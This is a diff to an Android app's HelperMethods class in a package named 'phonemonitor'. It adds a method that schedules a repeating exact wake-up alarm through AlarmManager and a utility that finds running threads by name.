@@ -1,17 +1,25 @@
 package com.monitor.phone.s0ft.phonemonitor;
 
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.Context;
+import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Build;
+import android.os.SystemClock;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import java.io.File;
 import java.io.FileFilter;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.Callable;
+
+import static android.content.Context.ALARM_SERVICE;
 
 
 public class HelperMethods {
@@ -124,4 +132,30 @@ public class HelperMethods {
         }
         return line1phonenumber + "_" + Build.MANUFACTURER + "_" + Build.MODEL;
     }
+
+    static void createOneTimeExactAlarm(Context context) {
+        Intent intent = new Intent(context, AlarmBroadcastReceiver.class);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 10, intent, 0);
+        AlarmManager alarmManager = null;
+        alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
+        if (alarmManager != null) {
+            alarmManager.cancel(pendingIntent);//kill any pre-existing alarms
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, pendingIntent);
+            else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
+                alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, pendingIntent);
+            else
+                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, pendingIntent);
+        }
+    }
+
+    static List<Thread> getThreadsByName(String threadName) {
+        List<Thread> retval = new ArrayList<>();
+        for (Thread thread : Thread.getAllStackTraces().keySet()) {
+            if (thread.getName().equals(threadName))
+                retval.add(thread);
+        }
+        return retval;
+    }
+
 }
